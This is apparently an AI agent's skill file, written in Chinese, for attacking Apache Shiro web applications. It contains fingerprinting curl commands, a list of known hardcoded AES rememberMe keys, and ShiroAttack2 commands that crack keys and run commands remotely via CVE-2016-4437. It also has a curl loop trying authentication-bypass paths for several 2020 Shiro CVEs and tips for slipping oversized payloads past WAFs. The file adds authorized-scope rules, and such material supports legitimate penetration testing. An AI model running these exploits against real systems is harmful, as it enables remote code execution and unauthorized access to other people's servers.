---
name: framework-shiro
description: Apache Shiro 专项：deleteMe 指纹、常见 AES Key 表+URLDNS 无害爆破判定、shiro-550 CB/CC 利用链与 CBC/GCM 模式选择、路径绕过 CVE 族（1957/11989/13933）、WAF 长度对抗
whenToUse: "响应出现 Set-Cookie: rememberMe=deleteMe、登录框带 rememberMe、Java 资产疑似 Shiro 时"
role: vuln-scan
enabled: true
---

# Shiro 框架专项

## 指纹判定 oracle

```bash
# Shiro 1.x 收到非法 rememberMe Cookie 必回 deleteMe（无损、首选）
curl -s -o /dev/null -D - "http://$TARGET/login" -H "Cookie: rememberMe=1" | grep -i "deleteMe"
# 辅助：首页与任意路由都测一遍，登录页命中率最高
curl -s -o /dev/null -D - "http://$TARGET/" -H "Cookie: rememberMe=deleteMe" | grep -i "deleteMe"
```

| 信号 | 判定 |
|---|---|
| `Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0` | Shiro 1.x 确认，可进入 Key 爆破 |
| 无 deleteMe 但页面有"记住我" | 只算弱指纹，后续用 Cookie 名变异（`rememberMe=`/`remember-me=`）再试 |
| WAF 返回拦截页 | 用 POST body 或非常规 Cookie 名重放，见下文 WAF 对抗 |

## Key 检测（URLDNS 无害判定）

原理：用 `SimplePrincipalCollection`（Shiro 自带对象，**不含任何 gadget**）+ 候选 Key 加密后发送。Key 错 → 服务端解密失败回 `deleteMe`；Key 对 → 正常处理、**无 deleteMe**。全程不触发反序列化执行链。

```bash
# 用 ShiroAttack2 CLI（GUI/CLI 同一攻击核心，--json 供脚本解析）
java -cp shiro_attack-5.1.1-all.jar com.summersec.attack.CLI.MainCLI detect -t "http://$TARGET"
java -cp shiro_attack-5.1.1-all.jar com.summersec.attack.CLI.MainCLI crack  -t "http://$TARGET" --json
```

高频 Key（节选，完整字典放 `data/shiro_keys.txt` 每行一个 Base64）：

| Key | 出现场景 |
|---|---|
| `kPH+bIxk5D2deZiIxcaaaA==` | ≤1.2.4 硬编码默认值，脚手架大量拷贝 |
| `2AvVhdsgUs0FSA3SDFAdag==` / `4AvVhmFLUs0KTA3Kprsdag==` / `5AvVhmFLUs0KTA3Kprsdag==` / `3AvVhmFLUs0KTA3Kprsdag==` / `1AvVhdsgUs0FSA3SDFAdag==` | 教程衍生高频值 |
| `Z3VucwAAAAAAAAAAAAAAAA==` / `fCq+/xW488hMTCD+cmJ3aQ==` / `wGiHplamyXlVB11XRWFAICQ==` / `L7RioUULEFhRyxM7a2R/Yg==` / `r0e3w16JkO7/7G5S/zXG5w==` / `6ZmI6I2j5Y+R5aSn5ZOlAA==` / `a2VlcE9uR29pbmdBbmRGaXJlMQ==` | 开源后台/网关常见 |
| `WcfHGU25gNnTxTlmJMeSpw==` / `bWluZS1pcy1rZXk/MTIzNDU2Nzg5` | 老系统硬编码 |

进一步佐证（仍无害）：Key 命中后发一条 URLDNS 序列化 Cookie（`URL` 对象 + dnslog 域），dnslog 收到回连 = 反序列化通道确认，再决定是否进入利用阶段。

## shiro-550（CVE-2016-4437）利用链选择

| 条件 | 链 | 说明 |
|---|---|---|
| 目标有 commons-collections 3.x/4.x | CC2/CC4/CC6 | 先试无依赖变体再试 CC |
| 目标**无** CC（Spring Boot 自带 BeanUtils） | CB（CommonsBeanutils 1.8.3/1.9.2）/ CBNoGadget / AttrCompare / ObjectToStringComparator | 需自带无依赖 Payload，命中率高 |
| Shiro ≤1.2.4 | AES-CBC | 加密模式与版本绑定 |
| Shiro ≥1.2.5 | AES-GCM | CBC/GCM 各跑一遍，哪个不出 deleteMe 用哪个 |

```bash
# CLI：exec 自动探测 gadget，命令写进 Authorization 头回显
java -cp shiro_attack-5.1.1-all.jar com.summersec.attack.CLI.MainCLI exec -t "http://$TARGET" -c "id" --json
```

链排序纪律：先 String/AttrCompare 无依赖变体 → 回退 CB → 最后 CC；每条链一次请求即停，别对同一目标反复全链轰炸。

## 权限路径绕过 CVE 族（Spring + Shiro 路由匹配差分）

```bash
for p in "/admin/" "/xxx/;/admin/" "/;/admin/" "/admin/%3bpage" "/admin/%2e%2e/admin" "/ %20/admin" "/admin/;" ; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$p")
  echo "$code $p"
done
```

| CVE | 变体 | 特征 |
|---|---|---|
| CVE-2020-1957 | `/xxx/;/admin/` | Spring 把 `;` 后当参数，Shiro 拿到 `/xxx/;/` 误判非保护路径 |
| CVE-2020-11989 | `/admin/%3bpage`、双重 URL 编码 | 多层 Controller 二次解码场景 |
| CVE-2020-13933 | `/admin/%3b*`、`%3b` 精简版 | 1957 补丁的再绕过 |
| CVE-2020-17523 | `/admin%20`、路径前带空格 | 1.5.2 前后 |
| CVE-2020-17510 | `/;/admin/` 变体编码 | 同族补充 |

判定 oracle：匿名请求受保护路径返回 200/业务数据（而非 302→login），同一路径不带变体返回 401/302，即绕过成立。

## WAF 对抗（rememberMe 超长 Cookie）

- **Header 长度**：多数 WAF 对单 Header 设 4-8KB 上限，序列化 Payload 动辄 2-6KB → 优先换短链（CBNoGadget）而不是硬塞。
- **分块传输**：`curl -H "Transfer-Encoding: chunked" --data-binary @cookie.bin` 或把 Cookie 拆到多个 `Cookie:` 行发送。
- **短 payload**：选 gadget 链最短的变体；只发 `SimplePrincipalCollection` 探测时不触发长度限制。
- 引用本地实测：`pocs/safeline-拦截页伪装成频控-签名大小写敏感绕过-thinkphp-__construct-家族通用/`（签名大小写敏感绕过，同为 WAF 判定链路，可迁移到 Shiro 场景做对照）。

## 纪律

- 仅授权范围内测试；探测只用 deleteMe/SimplePrincipalCollection/URLDNS，**禁用** sleep 型/文件型 gadget 做第一步。
- exec 确认后以 `id`/`whoami` 一类无害命令取证据即停，不做内存马持久化除非客户书面要求。
- 证据脱敏：报告里 Key 打码为前 4 字符，回显命令输出去掉主机名/IP 之外的内部信息。
- 不破坏目标：不跑 changekey 替换 Key（会让客户其他节点登录态失效）。

## 产出约定

- 记录：deleteMe 证据、命中 Key（脱敏）、AES 模式、gadget 链、执行结果截断输出。
- 回填 `redteam_poc_add`：category=shiro-550 或 shiro-bypass（路径绕过族单列），language=java/http，usage 写清 CLI 命令与 Key 判据。

<!-- 改编自: SummerSec/ShiroAttack2, zhzyker/exphub, 2026-10-31 -->
